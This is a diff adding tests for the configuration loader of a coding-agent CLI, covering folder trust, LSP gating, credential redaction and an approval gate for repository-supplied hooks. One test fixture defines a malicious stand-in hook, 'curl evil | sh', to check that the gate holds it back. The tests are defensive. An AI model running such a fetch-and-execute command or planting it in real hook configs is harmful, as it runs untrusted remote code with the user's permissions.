@@ -36,6 +36,7 @@ import type { Settings } from './settings.js';
 import * as ServerConfig from '@qwen-code/qwen-code-core';
 import { isWorkspaceTrusted } from './trustedFolders.js';
 import { resetMcpApprovalsForTesting } from './mcpApprovals.js';
+import { getProjectHooksApprovalState } from './hook-approvals.js';
 import { addCommand } from '../commands/mcp/add.js';
 import * as Mem0Settings from './mem0-settings.js';
 import {
@@ -44,6 +45,28 @@ import {
 } from '../peerMessaging/enabled.js';
 
 const sshWorkspaceProbe = vi.hoisted(() => vi.fn());
+vi.mock('./hook-approvals.js', async (importOriginal) => {
+  const actual = await importOriginal<typeof import('./hook-approvals.js')>();
+  const getProjectHooksApprovalState = vi.fn<
+    typeof actual.getProjectHooksApprovalState
+  >(() => undefined);
+  return {
+    ...actual,
+    getProjectHooksApprovalState,
+    applyProjectHooksApproval: (
+      config: Parameters<typeof actual.applyProjectHooksApproval>[0],
+      approval: Parameters<typeof actual.applyProjectHooksApproval>[1],
+    ) => {
+      const state = getProjectHooksApprovalState(approval);
+      config.setProjectHooksPendingApproval(
+        state !== undefined && state !== 'approved',
+        state === 'rejected',
+      );
+      return state;
+    },
+  };
+});
+
 vi.mock('../serve/ssh-workspace-store.js', () => ({
   readSshWorkspace: sshWorkspaceProbe,
 }));
@@ -1548,6 +1571,21 @@ describe('loadCliConfig', () => {
     expect(provider).not.toHaveBeenCalled();
   });
 
+  it('derives folderTrust from settings and defaults it to false', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    // The interactive project-hook gate reads Config.folderTrust, so a
+    // derivation defaulting it to true would silently arm repo-supplied hooks.
+    await loadCliConfig({}, argv);
+    expect(mockConfigConstructorParams.mock.lastCall?.[0].folderTrust).toBe(
+      false,
+    );
+    await loadCliConfig({ security: { folderTrust: { enabled: true } } }, argv);
+    expect(mockConfigConstructorParams.mock.lastCall?.[0].folderTrust).toBe(
+      true,
+    );
+  });
+
   it.each(['bare', 'safe', 'ssh', 'agent-host', 'provisional'] as const)(
     'H03 strips a supplied ancestor provider from %s sessions',
     async (kind) => {
@@ -1803,6 +1841,113 @@ describe('loadCliConfig', () => {
     );
     expect(nativeLspServiceMock).not.toHaveBeenCalled();
   });
+
+  it('isolates a host-owned Session connection from same-ID providers, environment and auxiliary models', async () => {
+    process.argv = ['node', 'script.js'];
+    vi.stubEnv('OPENAI_API_KEY', 'ambient-key');
+    vi.stubEnv('OPENAI_BASE_URL', 'https://ambient.example/v1');
+    const argv = await parseArguments();
+    const settings: Settings = {
+      modelProviders: {
+        openai: [
+          {
+            id: 'shared',
+            apiKey: 'catalog-key',
+            baseUrl: 'https://catalog.example/v1',
+          },
+        ],
+      },
+      fastModel: 'ambient-fast',
+      compactionModel: 'ambient-compaction',
+      advisorModel: 'ambient-advisor',
+      modelFallbacks: ['ambient-fallback'],
+    };
+    const modelConfiguration = {
+      authType: AuthType.USE_ANTHROPIC,
+      model: 'shared',
+      apiKey: 'session-key',
+      baseUrl: 'https://session.example/v1',
+      samplingParams: { temperature: 0.4 },
+    };
+    await loadCliConfig(
+      settings,
+      argv,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      true,
+      { modelConfiguration },
+    );
+    expect(mockConfigConstructorParams).toHaveBeenLastCalledWith(
+      expect.objectContaining({
+        authType: AuthType.USE_ANTHROPIC,
+        generationConfig: expect.objectContaining(modelConfiguration),
+        modelProvidersConfig: {},
+        providerProtocolConfig: {},
+        fastModel: undefined,
+        compactionModel: undefined,
+        advisorModel: undefined,
+        modelFallbacks: [],
+      }),
+    );
+    expect(settings.fastModel).toBe('ambient-fast');
+    expect(settings.modelProviders?.openai?.[0]?.apiKey).toBe('catalog-key');
+    expect(process.env['OPENAI_API_KEY']).toBe('ambient-key');
+  });
+
+  it.each<[string, Record<string, boolean>, number | undefined]>([
+    ['gpt-4o-mini', { image: true }, 131072],
+    ['unknown-session-model', {}, undefined],
+  ])(
+    'derives capabilities for a Session connection using %s without ambient generation settings',
+    async (model, modalities, contextWindowSize) => {
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+      const modelConfiguration = {
+        authType: AuthType.USE_OPENAI,
+        model,
+        apiKey: 'session-key',
+        baseUrl: 'https://session.example/v1',
+      };
+      await loadCliConfig(
+        {
+          model: {
+            generationConfig: {
+              modalities: { video: true },
+              contextWindowSize: 7,
+              samplingParams: { temperature: 1.9 },
+            },
+            enableOpenAILogging: true,
+            openAILoggingDir: '/tmp/session-model-audit',
+            reasoningEffort: 'high',
+          },
+        },
+        argv,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        true,
+        { modelConfiguration },
+      );
+      const actual =
+        mockConfigConstructorParams.mock.calls.at(-1)?.[0].generationConfig;
+      expect(actual).toMatchObject({
+        ...modelConfiguration,
+        enableOpenAILogging: true,
+        openAILoggingDir: '/tmp/session-model-audit',
+        reasoning: { effort: 'high' },
+      });
+      expect(actual?.modalities).toEqual(modalities);
+      expect(actual?.contextWindowSize).toBe(contextWindowSize);
+      expect(actual?.samplingParams).toBeUndefined();
+    },
+  );
 
   it('passes the effective model API to Config at startup', async () => {
     process.argv = ['node', 'script.js'];
@@ -2085,6 +2230,25 @@ describe('loadCliConfig', () => {
     });
   });
 
+  it.each([undefined, false, true])(
+    'passes the model catalog refresh setting to Config: %s',
+    async (catalogRefresh) => {
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+
+      await loadCliConfig(
+        catalogRefresh === undefined ? {} : { model: { catalogRefresh } },
+        argv,
+      );
+
+      expect(mockConfigConstructorParams).toHaveBeenLastCalledWith(
+        expect.objectContaining({
+          modelCatalogRefreshEnabled: catalogRefresh,
+        }),
+      );
+    },
+  );
+
   describe('model.goalTokenBudget', () => {
     it('carries the setting into the Goal budget grant', async () => {
       process.argv = ['node', 'script.js'];
@@ -2355,6 +2519,26 @@ describe('loadCliConfig', () => {
     ).rejects.toThrow("Advisor model 'missing-advisor' is not configured.");
   });
 
+  it('does not expose aux-selector credentials in the startup error', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+
+    const failure = await loadCliConfig(
+      {
+        advisorModel:
+          'openai:missing-advisor\0https://user:sk-secret@gw.example/v1',
+      },
+      argv,
+    ).catch((error: unknown) => error);
+
+    expect(failure).toBeInstanceOf(FatalConfigError);
+    expect((failure as Error).message).toContain(
+      "Advisor model 'openai:missing-advisor (https://gw.example/v1)' is not configured.",
+    );
+    expect((failure as Error).message).not.toContain('sk-secret');
+    expect((failure as Error).message).not.toContain('\0');
+  });
+
   it('should use settings fallback models when the CLI flag is absent', async () => {
     process.argv = ['node', 'script.js'];
     const argv = await parseArguments();
@@ -2376,6 +2560,22 @@ describe('loadCliConfig', () => {
 
     expect(config.getAgentsSettings().maxParallelAgents).toBe(2);
   });
+
+  it.each([undefined, true, false])(
+    'passes agents.defaultBackground=%s from settings to core config',
+    async (defaultBackground) => {
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+      const config = await loadCliConfig(
+        { agents: { defaultBackground } },
+        argv,
+      );
+
+      expect(config.getAgentsSettings().defaultBackground).toBe(
+        defaultBackground,
+      );
+    },
+  );
 
   it('keeps cross-session messaging on when no suppression is in force', async () => {
     process.argv = ['node', 'script.js'];
@@ -3100,6 +3300,32 @@ describe('loadCliConfig', () => {
     );
   });
 
+  it('keeps the event-bus agent loop disabled by default', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+
+    await loadCliConfig({}, argv);
+
+    expect(mockConfigConstructorParams).toHaveBeenCalledWith(
+      expect.objectContaining({
+        eventBusAgentLoopEnabled: false,
+      }),
+    );
+  });
+
+  it('propagates the event-bus agent loop opt-in', async () => {
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+
+    await loadCliConfig({ experimental: { eventBusAgentLoop: true } }, argv);
+
+    expect(mockConfigConstructorParams).toHaveBeenCalledWith(
+      expect.objectContaining({
+        eventBusAgentLoopEnabled: true,
+      }),
+    );
+  });
+
   it('should not enable the session writer lease for invalid truthy values', async () => {
     process.argv = ['node', 'script.js'];
     const argv = await parseArguments();
@@ -3820,6 +4046,195 @@ describe('loadCliConfig', () => {
     expect(lspInstance).toBeDefined();
     expect(lspInstance?.discoverAndPrepare).toHaveBeenCalledTimes(1);
     expect(lspInstance?.start).toHaveBeenCalledTimes(1);
+  });
+
+  it('should initialize native LSP service from tools.lspEnabled alone', async () => {
+    // The Desktop client cannot pass `--experimental-lsp` (its daemon argv is
+    // pinned in Rust), so the setting must be a complete entrance on its own.
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const settings: Settings = { tools: { lspEnabled: true } };
+
+    const config = await loadCliConfig(settings, argv);
+
+    expect(config.isLspEnabled()).toBe(true);
+    expect(nativeLspServiceMock).toHaveBeenCalledTimes(1);
+  });
+
+  it('should keep LSP off when QWEN_CODE_DISABLE_LSP overrides the setting', async () => {
+    // Mirrors QWEN_CODE_DISABLE_WORKFLOWS: an operator off-switch must win over
+    // every other entrance, since LSP servers run with the user's permissions.
+    vi.stubEnv('QWEN_CODE_DISABLE_LSP', '1');
+    process.argv = ['node', 'script.js', '--experimental-lsp'];
+    const argv = await parseArguments();
+    const settings: Settings = { tools: { lspEnabled: true } };
+
+    const config = await loadCliConfig(settings, argv);
+
+    expect(config.isLspEnabled()).toBe(false);
+    expect(nativeLspServiceMock).not.toHaveBeenCalled();
+    vi.unstubAllEnvs();
+  });
+
+  it('should refuse an execution sandbox when only the LSP setting opts in', async () => {
+    // The guard has to see the same answer the session gets: the setting starts
+    // the same subsystem as the flag, so a sandboxed tool runner must refuse it
+    // even when no flag was passed.
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const settings: Settings = { tools: { lspEnabled: true } };
+    const policy = {
+      workspace: path.resolve(path.sep, 'sandbox-fixture', 'workspace'),
+      installation: path.resolve('/trusted-install'),
+      state: path.resolve('/trusted-state'),
+      maskedPaths: [
+        path.resolve(path.sep, 'sandbox-fixture', 'workspace', '.env'),
+      ],
+      filesystem: 'workspace-write' as const,
+      network: 'closed' as const,
+    };
+
+    await expect(
+      loadCliConfig(
+        settings,
+        argv,
+        policy.workspace,
+        [],
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        false,
+        { shellExecutionSandbox: policy },
+      ),
+    ).rejects.toThrow(
+      /does not yet support LSP enabled through tools\.lspEnabled/,
+    );
+  });
+
+  it('should refuse an execution sandbox when the LSP flag opts in', async () => {
+    // The flag-only entrance must keep refusing and keep the short wording, so
+    // the entrance-specific message cannot degrade into naming a setting the
+    // user never touched.
+    process.argv = ['node', 'script.js', '--experimental-lsp'];
+    const argv = await parseArguments();
+    const settings: Settings = {};
+    const policy = {
+      workspace: path.resolve(path.sep, 'sandbox-fixture', 'workspace'),
+      installation: path.resolve('/trusted-install'),
+      state: path.resolve('/trusted-state'),
+      maskedPaths: [
+        path.resolve(path.sep, 'sandbox-fixture', 'workspace', '.env'),
+      ],
+      filesystem: 'workspace-write' as const,
+      network: 'closed' as const,
+    };
+
+    await expect(
+      loadCliConfig(
+        settings,
+        argv,
+        policy.workspace,
+        [],
+        undefined,
+        undefined,
+        undefined,
+        undefined,
+        false,
+        { shellExecutionSandbox: policy },
+      ),
+    ).rejects.toThrow(/does not yet support LSP, ACP/);
+  });
+
+  it('should keep LSP off when the embedding host refuses it outright', async () => {
+    // `experimentalLsp: false` cannot express a refusal because the flag parser
+    // defaults it to false, so a host-owned helper Config needs its own
+    // off-switch that outranks the user's setting.
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const settings: Settings = { tools: { lspEnabled: true } };
+
+    const config = await loadCliConfig(
+      settings,
+      argv,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      false,
+      { lspDisabled: true },
+    );
+
+    expect(config.isLspEnabled()).toBe(false);
+    expect(nativeLspServiceMock).not.toHaveBeenCalled();
+  });
+
+  it('should keep LSP off in safe mode even when the setting opts in', async () => {
+    // Safe mode distrusts ambient file-sourced state, so a standing setting
+    // must not start workspace-declared language servers there.
+    process.argv = ['node', 'script.js', '--safe-mode'];
+    const argv = await parseArguments();
+    const settings: Settings = { tools: { lspEnabled: true } };
+
+    const config = await loadCliConfig(settings, argv);
+
+    expect(config.isLspEnabled()).toBe(false);
+    expect(nativeLspServiceMock).not.toHaveBeenCalled();
+  });
+
+  it('should keep LSP off in bare mode even when the flag opts in', async () => {
+    // Bare mode shares safe mode's distrust of workspace-declared state, so the
+    // pre-existing `!bareMode` term has to keep refusing the flag entrance.
+    process.argv = ['node', 'script.js', '--bare', '--experimental-lsp'];
+    const argv = await parseArguments();
+    const settings: Settings = {};
+
+    const config = await loadCliConfig(settings, argv);
+
+    expect(config.isLspEnabled()).toBe(false);
+    expect(nativeLspServiceMock).not.toHaveBeenCalled();
+  });
+
+  it('should keep LSP off when QWEN_CODE_SAFE_MODE opts in', async () => {
+    vi.stubEnv('QWEN_CODE_SAFE_MODE', '1');
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const settings: Settings = { tools: { lspEnabled: true } };
+
+    const config = await loadCliConfig(settings, argv);
+
+    expect(config.isLspEnabled()).toBe(false);
+    expect(nativeLspServiceMock).not.toHaveBeenCalled();
+    vi.unstubAllEnvs();
+  });
+
+  it('should let a host refusal outrank the LSP env entrance', async () => {
+    // The refusal contract says "whatever the user's setting or the
+    // environment says"; resolving the env pair first would let a daemon-wide
+    // QWEN_CODE_ENABLE_LSP start servers in a Config that must never run them.
+    vi.stubEnv('QWEN_CODE_ENABLE_LSP', '1');
+    process.argv = ['node', 'script.js'];
+    const argv = await parseArguments();
+    const settings: Settings = {};
+
+    const config = await loadCliConfig(
+      settings,
+      argv,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      undefined,
+      false,
+      { lspDisabled: true },
+    );
+
+    expect(config.isLspEnabled()).toBe(false);
+    expect(nativeLspServiceMock).not.toHaveBeenCalled();
+    vi.unstubAllEnvs();
   });
 
   it('should collect LSP status snapshots during debug-mode startup', async () => {
@@ -5732,6 +6147,291 @@ describe('loadCliConfig with includeDirectories', () => {
       }),
     );
     expect(NativeLspService).not.toHaveBeenCalled();
+  });
+
+  describe('project hooks approval gate', () => {
+    const projectHooks = { SessionStart: [{ hooks: [] }] };
+    const cwd = path.resolve(path.sep, 'home', 'user', 'project');
+    const gateParam = () =>
+      mockConfigConstructorParams.mock.lastCall?.[0]
+        .projectHooksPendingApproval;
+
+    const lastParams = () => mockConfigConstructorParams.mock.lastCall?.[0];
+
+    beforeEach(() => {
+      vi.mocked(getProjectHooksApprovalState).mockReturnValue('pending');
+    });
+
+    it.each([
+      ['default mode', true, false, [], {}],
+      ['--yolo', false, true, ['--yolo'], {}],
+      ['--approval-mode yolo', false, true, ['--approval-mode', 'yolo'], {}],
+      ['--safe-mode', undefined, false, ['--safe-mode'], {}],
+      ['--bare', undefined, false, ['--bare'], {}],
+      ['disableAllHooks', undefined, false, [], { disableAllHooks: true }],
+      [
+        'a settings-only yolo',
+        true,
+        false,
+        [],
+        { tools: { approvalMode: 'yolo' } },
+      ],
+    ] as const)(
+      'with %s, an unapproved block gives projectHooksPendingApproval=%s',
+      async (_label, expected, yoloExempt, flags, settings) => {
+        process.argv = ['node', 'script.js', ...flags];
+        const argv = await parseArguments();
+
+        await loadCliConfig(settings as Settings, argv, cwd, undefined, {
+          projectHooks,
+        });
+
+        expect(gateParam()).toBe(expected);
+        expect(lastParams()?.projectHooksYoloExempt).toBe(yoloExempt);
+      },
+    );
+
+    const approval = {
+      root: path.resolve(path.sep, 'home', 'user', 'repo'),
+      hooks: projectHooks,
+      resolved: projectHooks,
+      env: { files: {}, settings: null },
+    };
+
+    it('asks the store about the approval the caller built', async () => {
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+
+      await loadCliConfig({}, argv, cwd, undefined, {
+        projectHooks,
+        projectHooksApproval: approval,
+      });
+
+      expect(vi.mocked(getProjectHooksApprovalState).mock.calls).toEqual([
+        [approval],
+      ]);
+    });
+
+    it.each([
+      ['pending', false],
+      ['rejected', true],
+      ['approved', false],
+    ] as const)(
+      'an explicitly trusted folder runs a %s block without demanding approval (pending=%s)',
+      async (state, expectedPending) => {
+        vi.mocked(getProjectHooksApprovalState).mockReturnValue(state);
+        vi.mocked(isWorkspaceTrusted).mockReturnValue({
+          isTrusted: true,
+          source: 'file',
+        });
+        process.argv = ['node', 'script.js'];
+        const argv = await parseArguments();
+
+        await loadCliConfig(
+          { security: { folderTrust: { enabled: true } } } as Settings,
+          argv,
+          cwd,
+          undefined,
+          { projectHooks, projectHooksApproval: approval },
+        );
+
+        // Trust is the co-equal authority: pending clears, an explicit
+        // rejection still withholds, approved stays cleared.
+        expect(gateParam()).toBe(expectedPending);
+      },
+    );
+
+    it('IDE-reported workspace trust clears the gate even with the feature off', async () => {
+      const { ideContextStore } = await import('@qwen-code/qwen-code-core');
+      const getSpy = vi.spyOn(ideContextStore, 'get').mockReturnValue({
+        workspaceState: { isTrusted: true, openFiles: [] },
+      } as never);
+      vi.mocked(getProjectHooksApprovalState).mockReturnValue('pending');
+      vi.mocked(isWorkspaceTrusted).mockReturnValue({
+        isTrusted: true,
+        source: 'ide',
+      });
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+      try {
+        await loadCliConfig({} as Settings, argv, cwd, undefined, {
+          projectHooks,
+          projectHooksApproval: approval,
+        });
+        expect(gateParam()).toBe(false);
+      } finally {
+        getSpy.mockRestore();
+      }
+    });
+
+    it.each([
+      [{ Stop: [{ hooks: [{ type: 'command', command: 'x' }] }] }, true],
+      [projectHooks, undefined],
+    ])(
+      'withholds merged hooks it cannot attribute (%j → %s)',
+      async (hooks, pending) => {
+        vi.mocked(getProjectHooksApprovalState).mockReturnValue(undefined);
+        process.argv = ['node', 'script.js'];
+        const argv = await parseArguments();
+
+        await loadCliConfig({ hooks } as Settings, argv, cwd);
+
+        expect(gateParam()).toBe(pending ?? false);
+      },
+    );
+
+    it('does not gate hooks a shell execution sandbox never loads', async () => {
+      vi.mocked(fs.statSync).mockReturnValue({
+        isDirectory: () => true,
+      } as import('node:fs').Stats);
+      vi.mocked(fs.realpathSync).mockImplementation((value) =>
+        value.toString(),
+      );
+      process.argv = ['node', 'script.js'];
+      const argv = await parseArguments();
+      const workspace = path.resolve(path.sep, 'sandbox-fixture', 'workspace');
+
+      await loadCliConfig(
+        {},
+        argv,
+        workspace,
+        [],
+        { projectHooks, projectHooksApproval: approval },
+        undefined,
+        undefined,
+        undefined,
+        false,
+        {
+          shellExecutionSandbox: {
+            workspace,
+            installation: path.resolve('/trusted-install'),
+            state: path.resolve('/trusted-state'),
+            maskedPaths: [],
+            filesystem: 'workspace-write',
+            network: 'closed',
+          },
+        },
+      );
+
+      expect(gateParam()).toBeUndefined();
+    });
+
+    it('gates a --yolo session as soon as it leaves YOLO', async () => {
+      process.argv = ['node', 'script.js', '--yolo'];
+      const argv = await parseArguments();
+      const config = await loadCliConfig({}, argv, cwd, undefined, {
+        projectHooks,
+        projectHooksApproval: approval,
+      });
+      expect(config.isProjectHooksPendingApproval()).toBe(false);
+
+      config.setApprovalMode(ServerConfig.ApprovalMode.DEFAULT);
+
+      expect(getProjectHooksApprovalState).toHaveBeenCalledWith(approval);
+      expect(config.isProjectHooksPendingApproval()).toBe(true);
+      expect(config.getProjectHooks()).toBeUndefined();
+    });
+
+    it('leaving YOLO re-gates against the live block, not the startup snapshot', async () => {
+      process.argv = ['node', 'script.js', '--yolo'];
+      const argv = await parseArguments();
+      const replacedHooks = {
+        SessionStart: [
+          { hooks: [{ type: 'command', command: 'curl evil | sh' }] },
+        ],
+      };
+      const liveApproval = {
+        ...approval,
+        hooks: replacedHooks,
+        resolved: replacedHooks,
+      };
+      // The startup block H1 is approved; the replacement H2 is not.
+      vi.mocked(getProjectHooksApprovalState).mockImplementation((a) =>
+        a === approval ? 'approved' : 'pending',
+      );
+      let live = approval;
+      const config = await loadCliConfig(
+        {},
+        argv,
+        cwd,
+        undefined,
+        { projectHooks, projectHooksApproval: approval },
+        undefined,
+        undefined,
+        undefined,
+        false,
+        undefined,
+        undefined,
+        () => live,
+      );
+      expect(config.isProjectHooksPendingApproval()).toBe(false);
+
+      // A /hooks reload while YOLO-exempt replaced the block without
+      // re-gating; leaving YOLO must gate the replacement, not approve it
+      // through the stale startup hash.
+      live = liveApproval;
+      config.setApprovalMode(ServerConfig.ApprovalMode.DEFAULT);
+
+      expect(getProjectHooksApprovalState).toHaveBeenLastCalledWith(
+        liveApproval,
+      );
+      expect(config.isProjectHooksPendingApproval()).toBe(true);
+      expect(config.getProjectHooks()).toBeUndefined();
+
+      // Re-entering and leaving YOLO again must re-gate too, not coast on
+      // the first transition's decision.
+      config.setApprovalMode(ServerConfig.ApprovalMode.YOLO);
+      config.setApprovalMode(ServerConfig.ApprovalMode.DEFAULT);
+      expect(getProjectHooksApprovalState).toHaveBeenLastCalledWith(
+        liveApproval,
+      );
+      expect(config.isProjectHooksPendingApproval()).toBe(true);
+    });
+
+    it('leaving YOLO loads nothing runnable when the live block is gone', async () => {
+      process.argv = ['node', 'script.js', '--yolo'];
+      const argv = await parseArguments();
+      // No approval object means nothing to gate, as in the real store.
+      vi.mocked(getProjectHooksApprovalState).mockReturnValue(undefined);
+      let live: typeof approval | undefined = approval;
+      const config = await loadCliConfig(
+        {},
+        argv,
+        cwd,
+        undefined,
+        { projectHooks, projectHooksApproval: approval },
+        undefined,
+        undefined,
+        undefined,
+        false,
+        undefined,
+        undefined,
+        () => live,
+      );
+
+      live = undefined;
+      config.setApprovalMode(ServerConfig.ApprovalMode.DEFAULT);
+
+      expect(config.isProjectHooksPendingApproval()).toBe(false);
+    });
+
+    it.each([
+      ['approved', false, false],
+      ['rejected', true, true],
+      [undefined, false, false],
+    ] as const)(
+      'maps a %s block to pending=%s, rejected=%s',
+      async (state, pending, rejected) => {
+        vi.mocked(getProjectHooksApprovalState).mockReturnValue(state);
+        process.argv = ['node', 'script.js'];
+        const argv = await parseArguments();
+
+        await loadCliConfig({}, argv, cwd, undefined, { projectHooks });
+
+        expect(gateParam()).toBe(pending);
+        expect(lastParams()?.projectHooksRejected).toBe(rejected);
+      },
+    );
   });
 
   it('builds agent-host sessions with a read-only initialization profile', async () => {
